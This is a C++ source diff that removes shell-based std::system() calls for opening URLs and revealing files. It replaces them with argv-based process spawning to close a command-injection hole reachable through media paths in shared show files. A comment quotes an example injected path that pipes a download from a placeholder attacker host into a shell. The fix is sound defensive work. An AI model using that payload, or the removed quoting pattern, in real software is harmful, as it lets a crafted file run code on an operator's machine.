@@ -17,7 +17,26 @@
 
 #pragma once
 
+// NOTHING HERE MAY GO THROUGH A SHELL.
+//
+// These take a URL and a MEDIA PATH, and a media path comes out of the show
+// file -- which is a document people send each other. Both used to be pasted
+// into a std::system() command line inside double quotes, and double quotes do
+// not disarm a shell: $, backtick and " itself all still work. A cue whose
+// path was
+//
+//     /tmp/x";curl evil.example/x|sh;"
+//
+// ran that the moment an operator picked "show in explorer" on it. Opening
+// somebody's show is meant to be safe.
+//
+// spawnDetachedProcess takes an argv VECTOR and never builds a command line,
+// so there is no shell to escape from and nothing to get the quoting right
+// for. On Windows ShellExecuteW was already argv-shaped and is unchanged.
+#include "core/subprocess.hpp"
+
 #include <string>
+#include <vector>
 
 #if defined(_WIN32)
   #ifndef WIN32_LEAN_AND_MEAN
@@ -52,12 +71,20 @@ inline bool openExternalUrl(const std::string& url) {
   HINSTANCE result = ::ShellExecuteW(nullptr, L"open", wurl.c_str(),
                                       nullptr, nullptr, SW_SHOWNORMAL);
   return reinterpret_cast<INT_PTR>(result) > 32;
-#elif defined(__APPLE__)
-  std::string cmd = std::string("open \"") + url + "\" >/dev/null 2>&1 &";
-  return std::system(cmd.c_str()) == 0;
 #else
-  std::string cmd = std::string("xdg-open \"") + url + "\" >/dev/null 2>&1 &";
-  return std::system(cmd.c_str()) == 0;
+  // ALSO A REAL RESULT. std::system on a backgrounded command returns the
+  // shell's status, which is 0 whether or not the opener exists -- so this
+  // reported success on a machine with no xdg-open at all.
+  #if defined(__APPLE__)
+  const char* opener = "open";
+  #else
+  const char* opener = "xdg-open";
+  #endif
+  // Unqualified: subprocess.hpp declares these at global scope, and this
+  // branch is #else-guarded so Windows never compiles it -- a namespace
+  // that does not exist would have reached CI, not the desk.
+  ChildProcess child;
+  return spawnDetachedProcess(child, {opener, url});
 #endif
 }
 
@@ -87,8 +114,8 @@ inline bool revealFileInFileManager(const std::string& path) {
                                       wargs.c_str(), nullptr, SW_SHOWNORMAL);
   return reinterpret_cast<INT_PTR>(result) > 32;
 #elif defined(__APPLE__)
-  std::string cmd = std::string("open -R \"") + path + "\" >/dev/null 2>&1 &";
-  return std::system(cmd.c_str()) == 0;
+  ChildProcess child;
+  return spawnDetachedProcess(child, {"open", "-R", path});
 #else
   // No portable "select" on Linux; open the containing directory.
   std::string dir = path;
@@ -96,8 +123,8 @@ inline bool revealFileInFileManager(const std::string& path) {
   if (slash != std::string::npos) {
     dir = dir.substr(0, slash);
   }
-  std::string cmd = std::string("xdg-open \"") + dir + "\" >/dev/null 2>&1 &";
-  return std::system(cmd.c_str()) == 0;
+  ChildProcess child;
+  return spawnDetachedProcess(child, {"xdg-open", dir});
 #endif
 }
 
